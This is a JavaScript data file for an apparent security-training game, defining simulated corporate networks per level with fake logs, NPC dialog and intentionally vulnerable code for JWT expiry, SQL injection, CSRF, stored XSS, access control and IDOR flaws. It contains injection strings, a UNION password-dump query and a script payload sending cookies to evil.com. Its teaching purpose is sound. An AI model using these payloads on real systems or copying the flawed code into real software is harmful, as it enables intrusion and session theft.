// Network topology definitions for each level

export const LEVEL_1_NETWORK = [
  {
    id: "auth",
    name: "Auth Service",
    hostname: "auth-service-01.techcorp.local",
    type: "auth",
    description: "JWT token validator",
    status: "unexamined",
    scanResult: "Auth service running. Issues JWT tokens for authenticated users.",
    logs: `[2024-11-11 08:23:42] WARN  Expiration validation: DISABLED
[2024-11-11 09:15:23] INFO  Token validated: user=contractor_mike_2024, role=admin
[2024-11-11 14:32:11] INFO  Token validated: user=contractor_mike_2024, role=admin
[2024-11-11 23:47:03] INFO  Token validated: user=contractor_mike_2024, role=admin`,
    clue: "auth_config",
    sampleToken:
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjb250cmFjdG9yX21pa2VfMjAyNCIsIm5hbWUiOiJNaWtlIEpvaG5zb24iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDQwNjcyMDAsImV4cCI6MTcwOTI1MTIwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
    tokenData: {
      requiresClues: ["suspicious_user", "auth_config"],
      details: `Analyzing token...
Payload: {
  "sub": "contractor_mike_2024",
  "role": "admin",
  "iat": 1704067200,  // Jan 1, 2024
  "exp": 1709251200   // Mar 1, 2024
}
Current date: Nov 11, 2024
⚠️ Token expired 8 months ago but still accepted!`,
      solution:
        'JWT tokens MUST be validated for expiration. The "exp" claim should be checked against current time.',
    },
    vulnerability: "jwt_expiration",
    npc: {
      name: "👨‍💼 Backend Developer",
      dialog:
        "I temporarily disabled JWT expiration checking to debug a clock skew issue. Did I forget to re-enable it?",
    },
  },
  {
    id: "database",
    name: "Database",
    hostname: "db-primary-01.techcorp.local",
    type: "database",
    description: "User data storage",
    status: "unexamined",
    scanResult: "Database running normally. Recent queries show unusual patterns.",
    logs: `2024-11-08 02:16:12 UTC [contractor_mike_2024]
  COPY (SELECT * FROM financial_transactions) TO '/tmp/export.csv';
  Duration: 153s, Rows: 428,941
2024-11-07 03:22:18 UTC [contractor_mike_2024]
  COPY (SELECT cc_number, cvv FROM payments) TO '/tmp/cards.csv';
  Duration: 98s, Rows: 89,234`,
    clue: "suspicious_user",
    npc: {
      name: "🗄️ DBA",
      dialog:
        "Large data exports from 'contractor_mike_2024' at odd hours. User has admin privileges so I assumed it was legitimate.",
    },
  },
  {
    id: "admin",
    name: "HR System",
    hostname: "hr-system.techcorp.local",
    type: "workstation",
    description: "Employee records",
    status: "unexamined",
    scanResult: "HR system tracks employee status and access.",
    logs: `Employee: Mike Johnson
Account: contractor_mike_2024
Contract end: March 1, 2024
Status: TERMINATED
Access revocation: FAILED - tokens still valid`,
    clue: "expired_contractor",
    npc: {
      name: "👤 HR Manager",
      dialog:
        "Mike Johnson was a contractor from Jan-Mar 2024. Talented developer, worked on our auth system. His contract ended March 1st.",
    },
  },
  {
    id: "web",
    name: "Web Server",
    hostname: "web-server-01.techcorp.local",
    type: "webserver",
    description: "Application server",
    status: "unexamined",
    scanResult: "Web server handling requests normally.",
    logs: "All incoming requests have valid JWT signatures. No anomalies detected.",
    npc: {
      name: "👩‍💻 Frontend Developer",
      dialog:
        "Everything seems fine here. All requests are authenticated. Maybe check the auth service?",
    },
  },
]

export const LEVEL_2_NETWORK = [
  {
    id: "api-server",
    name: "API Server",
    hostname: "api-backend-01.techcorp.local",
    type: "api",
    description: "Backend API server",
    status: "unexamined",
    scanResult: "Node.js API server running on port 3000.",
    logs: `[INFO] Server started on port 3000
[WARN] Using string concatenation for SQL queries
[ERROR] Unexpected SQL error: syntax error near "OR"
[INFO] Request: /api/users?id=1' OR '1'='1`,
    sourceCode: `// api/users.js
app.get('/api/users', (req, res) => {
  const userId = req.query.id;
  // ❌ VULNERABLE: String concatenation
  const query = "SELECT * FROM users WHERE id = '" + userId + "'";
  db.query(query, (err, results) => {
    if (err) return res.status(500).json({error: err.message});
    res.json(results);
  });
});

// ❌ ALSO VULNERABLE: Hardcoded credentials
const DB_PASSWORD = "SuperSecret123!";
const db = mysql.createConnection({
  host: 'db-primary-01',
  user: 'admin',
  password: DB_PASSWORD,
  database: 'users_db'
});`,
    vulnerability: "sql_injection",
    clue: "source_code_secrets",
    npc: {
      name: "👨‍💼 Backend Engineer",
      dialog:
        "Just takes the ID from the query string and looks up the user. Wait, you're not suggesting someone could manipulate that, are you?",
    },
  },
  {
    id: "database",
    name: "Database",
    hostname: "db-primary-01.techcorp.local",
    type: "database",
    description: "MySQL database",
    status: "unexamined",
    scanResult: "MySQL 8.0 running on port 3306.",
    logs: `MySQL Query Log:
[11:24:01] SELECT * FROM users WHERE id = '1' OR '1'='1'
            ^^^ Returned 1,247 rows instead of 1!
[11:24:15] SELECT * FROM users WHERE id = '1' UNION SELECT password FROM admin_users--'
            ^^^ CRITICAL: Password dump attempt!`,
    clue: "suspicious_queries",
    npc: {
      name: "🗄️ Database Admin",
      dialog:
        "Seeing weird queries with ' OR '1'='1' in them. That shouldn't be possible if inputs are sanitized... right?",
    },
  },
  {
    id: "repo",
    name: "Git Repository",
    hostname: "git.techcorp.local",
    type: "git",
    description: "Source code repository",
    status: "unexamined",
    scanResult: "GitLab CE, 1,247 commits.",
    logs: `Recent commits:
abc123 - "Quick fix for user API" (contains hardcoded password)
def456 - "Add admin password to config" (committed secrets)
⚠️ Secrets detected in commit history`,
    sourceAccess: true,
    npc: {
      name: "👩‍💻 DevOps Lead",
      dialog:
        "All the API code is in the repo. You have read access. Just... don't judge our code quality too harshly.",
    },
  },
  {
    id: "gateway",
    name: "API Gateway",
    hostname: "api-gateway-02.techcorp.local",
    type: "gateway",
    description: "Main API entry point",
    status: "unexamined",
    scanResult: "Gateway routing traffic to backend services.",
    logs: `API Request logs:
GET /api/users?id=1 - 200 OK
GET /api/users?id=1' OR '1'='1 - 200 OK (returned ALL users!)
⚠️ Suspicious query pattern detected`,
    clue: "injectable_endpoint",
    npc: {
      name: "💻 API Developer",
      dialog:
        "The /api/users endpoint takes an ID parameter. Built it quickly for the demo. It works fine... I think?",
    },
  },
]

export const LEVEL_4_NETWORK = [
  {
    id: "api-backend",
    name: "API Backend",
    hostname: "api-backend-01.techcorp.local",
    type: "api",
    description: "Backend API for state changes",
    status: "unexamined",
    scanResult: "Express.js API handling account operations.",
    logs: `[INFO] DELETE /api/account/delete
[INFO] Session validated: user=victim_user
[WARN] No CSRF token present
[ERROR] Unauthorized account deletion reported`,
    sourceCode: `// api/account.js
app.post('/api/account/delete', requireAuth, (req, res) => {
  const userId = req.session.userId;
  // ❌ VULNERABLE: No CSRF protection
  // Any site can make this request if user has session
  db.deleteAccount(userId, (err) => {
    if (err) return res.status(500).json({error: err.message});
    req.session.destroy();
    res.json({success: true});
  });
});`,
    vulnerability: "csrf_protection",
    clue: "forged_request",
    npc: {
      name: "👨‍💼 Backend Developer",
      dialog:
        "We check session cookies on all requests. If you're logged in, you can modify your account. Can other sites make requests on behalf of users?",
    },
  },
  {
    id: "web-app",
    name: "Web Application",
    hostname: "webapp-01.techcorp.local",
    type: "webapp",
    description: "User-facing web app",
    status: "unexamined",
    scanResult: "Web app serving user dashboard.",
    logs: `[INFO] POST /api/account/update - 200 OK
[WARN] POST /api/account/delete (Referer: evil-site.com)
⚠️ No CSRF token validation detected`,
    clue: "missing_csrf_validation",
    npc: {
      name: "👩‍💻 Frontend Developer",
      dialog: "Forms POST to the API with the user's session cookie. Simple and effective, right?",
    },
  },
  {
    id: "user-browser",
    name: "User Browser",
    hostname: "user-workstation-01",
    type: "client",
    description: "Victim's browser",
    status: "unexamined",
    scanResult: "Browser with active session.",
    logs: `[10:24:13] User visits malicious-site.com
[10:24:14] Hidden form auto-submits to webapp-01
[10:24:15] Browser includes session cookie automatically
[10:24:16] Account deleted without user knowledge
⚠️ CSRF attack successful`,
    clue: "suspicious_state_change",
    npc: {
      name: "😰 Victim User",
      dialog:
        "Clicked a link that said 'You won a prize!' and suddenly my account was gone! I never clicked delete!",
    },
  },
  {
    id: "security-logs",
    name: "Security Monitoring",
    hostname: "security-01.techcorp.local",
    type: "monitoring",
    description: "Security event monitoring",
    status: "unexamined",
    scanResult: "SIEM collecting security events.",
    logs: `[ALERT] Account deletions from external Referer headers
Pattern: User session + external site + no CSRF token
Recommendation: Implement CSRF protection`,
    npc: {
      name: "🔒 Security Engineer",
      dialog:
        "All unauthorized changes show external Referer headers. We need CSRF protection ASAP.",
    },
  },
]

export const LEVEL_5_NETWORK = [
  {
    id: "comment-system",
    name: "Comment System",
    hostname: "comments-01.techcorp.local",
    type: "webapp",
    description: "User comments",
    status: "unexamined",
    scanResult: "Web app with user-generated content.",
    logs: `[INFO] Comment: "Great product!"
[INFO] Comment: "<script>alert('XSS')</script>"
[ERROR] Script executed in users' browsers
⚠️ Stored XSS vulnerability`,
    clue: "unsanitized_input",
    npc: {
      name: "👨‍💻 Developer",
      dialog: "Users can leave comments. We use innerHTML to render them. Is that a problem?",
    },
  },
  {
    id: "database",
    name: "Comments Database",
    hostname: "db-01.techcorp.local",
    type: "database",
    description: "Stores comments",
    status: "unexamined",
    scanResult: "MongoDB storing comments.",
    logs: `Database entries:
{ text: "Love this!" }
{ text: "<script>fetch('https://evil.com?c='+document.cookie)</script>" }
⚠️ Malicious JavaScript stored`,
    clue: "script_injection",
    npc: {
      name: "🗄️ Database Admin",
      dialog: "Seeing comments with <script> tags. Should we be filtering this?",
    },
  },
  {
    id: "web-server",
    name: "Web Server",
    hostname: "web-01.techcorp.local",
    type: "webserver",
    description: "Serves pages",
    status: "unexamined",
    scanResult: "Nginx serving Node.js app.",
    logs: `Headers:
Content-Type: text/html
[MISSING] Content-Security-Policy
⚠️ No CSP headers`,
    clue: "missing_csp",
    sourceCode: `// comments.js
app.get('/product/:id', (req, res) => {
  db.getComments(req.params.id, (comments) => {
    const html = comments.map(c =>
      // ❌ VULNERABLE: innerHTML with user data
      \`<div>\${c.text}</div>\`
    ).join('');
    res.send(html);
  });
});`,
    vulnerability: "stored_xss",
    npc: {
      name: "🖥️ DevOps",
      dialog: "I can add security headers if you tell me what we need. Content Security Policy?",
    },
  },
  {
    id: "victim-browser",
    name: "Victim Browser",
    hostname: "user-pc-42",
    type: "client",
    description: "User viewing comments",
    status: "unexamined",
    scanResult: "Browser loading product page.",
    logs: `[10:45:23] Rendering comments...
[10:45:23] ⚠️ Executing: fetch("evil.com?c=" + document.cookie)
[10:45:24] ⚠️ Session cookie sent to attacker`,
    npc: {
      name: "😨 Victim User",
      dialog:
        "Was reading reviews and got redirected to a weird site. Then my account was accessed from Russia!",
    },
  },
]

export const LEVEL_6_NETWORK = [
  {
    id: "admin-panel",
    name: "Admin Panel",
    hostname: "admin.techcorp.local",
    type: "webapp",
    description: "Administrative interface",
    status: "unexamined",
    scanResult: "Web interface for system admin.",
    logs: `[INFO] GET /admin - 200 OK (user: admin_alice)
[INFO] GET /admin - 200 OK (user: regular_bob)  ⚠️
[ERROR] Authorization bypass detected`,
    clue: "missing_auth_check",
    sourceCode: `// admin.js
// ❌ VULNERABLE: Only checks login, not role
app.get('/admin', requireLogin, (req, res) => {
  // Missing: if (req.user.role !== 'admin') return 403
  res.render('admin-panel', {
    users: getAllUsers(),
    settings: getSystemSettings()
  });
});`,
    vulnerability: "auth_bypass",
    npc: {
      name: "👨‍💼 Admin Lead",
      dialog:
        "Admin panel is protected by login. That's enough security, right? Need to check roles too?",
    },
  },
  {
    id: "api-server",
    name: "API Server",
    hostname: "api-01.techcorp.local",
    type: "api",
    description: "Backend API",
    status: "unexamined",
    scanResult: "REST API with auth bypass.",
    logs: `[INFO] POST /api/user/456/promote {"role": "admin"}
User: regular_bob (456) promoted themselves!
⚠️ Insecure Direct Object Reference (IDOR)`,
    clue: "privilege_escalation",
    npc: {
      name: "👩‍💻 API Developer",
      dialog:
        "We check login but don't verify permission to access specific resources. Assumed users would only request their own data?",
    },
  },
  {
    id: "session-store",
    name: "Session Store",
    hostname: "redis-01.techcorp.local",
    type: "cache",
    description: "Session management",
    status: "unexamined",
    scanResult: "Redis storing session tokens.",
    logs: `Session IDs: user_[timestamp]_[counter]
Examples:
  user_1699632000_001
  user_1699632001_002
⚠️ Predictable! Attacker can enumerate sessions.`,
    clue: "insecure_session",
    vulnerability: "broken_access_control",
    npc: {
      name: "🔧 Infrastructure Engineer",
      dialog:
        "We use timestamps and counters for session IDs. Makes debugging easier. Should they be random?",
    },
  },
  {
    id: "audit-log",
    name: "Audit System",
    hostname: "audit-01.techcorp.local",
    type: "logging",
    description: "Security audit logging",
    status: "unexamined",
    scanResult: "Audit trail of security events.",
    logs: `[2024-11-10 14:23:11] 'regular_bob' accessed /admin
[2024-11-10 14:23:45] 'regular_bob' promoted user_id 456 to admin
[2024-11-10 14:24:12] 'regular_bob' accessed other users' data`,
    npc: {
      name: "🔍 Security Auditor",
      dialog:
        "Logs show privilege escalation: missing auth checks, IDOR, and predictable session tokens.",
    },
  },
]

export const LEVEL_7_NETWORK = [
  {
    id: "user-api",
    name: "User API",
    hostname: "user-api-01.techcorp.local",
    type: "api",
    description: "User management API",
    status: "unexamined",
    scanResult: "RESTful API for user operations.",
    logs: `GET /api/users/123 returns:
{
  "id": 123,
  "username": "alice",
  "email": "alice@company.com",
  "ssn": "123-45-6789",  ⚠️ Exposed!
  "salary": 95000,       ⚠️ Exposed!
  "internalNotes": "Performance issues"  ⚠️
}`,
    clue: "sensitive_data_leak",
    vulnerability: "excessive_data_exposure",
    sourceCode: `// user-api.js
app.get('/api/users/:id', requireAuth, (req, res) => {
  // ❌ Returns entire user object
  // ❌ No ownership check (IDOR)
  db.users.findById(req.params.id, (err, user) => {
    res.json(user);  // No filtering!
  });
});`,
    npc: {
      name: "👨‍💻 Backend Developer",
      dialog:
        "We return the user object from database. Has all the fields frontend might need. Should we filter?",
    },
  },
  {
    id: "api-gateway",
    name: "API Gateway",
    hostname: "api-gw.techcorp.local",
    type: "gateway",
    description: "REST API gateway",
    status: "unexamined",
    scanResult: "Kong API Gateway.",
    logs: `[WARN] 10,000 requests from 192.168.1.100 in 60 seconds
[ERROR] User enumeration attack in progress
⚠️ No rate limiting`,
    clue: "no_rate_limits",
    npc: {
      name: "🔧 Platform Engineer",
      dialog:
        "Removed rate limiting during load testing and forgot to re-enable. API should be fast, right?",
    },
  },
  {
    id: "authorization",
    name: "Authorization Service",
    hostname: "authz-01.techcorp.local",
    type: "auth",
    description: "Access control",
    status: "unexamined",
    scanResult: "Authorization service (Casbin).",
    logs: `[INFO] Can user 456 read user 123?
[WARN] No policy defined - defaulting to ALLOW
❌ Missing object-level authorization
❌ Missing field-level permissions`,
    clue: "idor_vulnerability",
    vulnerability: "broken_object_authorization",
    npc: {
      name: "🔐 Security Architect",
      dialog:
        "Authentication works but weak authorization. Users can access objects they don't own (IDOR) and see sensitive fields.",
    },
  },
  {
    id: "monitoring",
    name: "API Monitoring",
    hostname: "monitor-api.techcorp.local",
    type: "monitoring",
    description: "DataDog APM",
    status: "unexamined",
    scanResult: "Application monitoring.",
    logs: `[CRITICAL] User enumeration detected
Source: 192.168.1.100
Pattern: Sequential user IDs (1-10000)
Rate: 167 requests/second
Data: 450 MB with SSN, salary data`,
    npc: {
      name: "📊 SRE Team",
      dialog:
        "Monitoring caught massive data scraping. Someone enumerated all 10,000 users. API has zero protection!",
    },
  },
]

export function getNetworkForLevel(levelId) {
  switch (levelId) {
    case 1:
      return LEVEL_1_NETWORK
    case 2:
      return LEVEL_2_NETWORK
    case 4:
      return LEVEL_4_NETWORK
    case 5:
      return LEVEL_5_NETWORK
    case 6:
      return LEVEL_6_NETWORK
    case 7:
      return LEVEL_7_NETWORK
    default:
      return LEVEL_1_NETWORK
  }
}
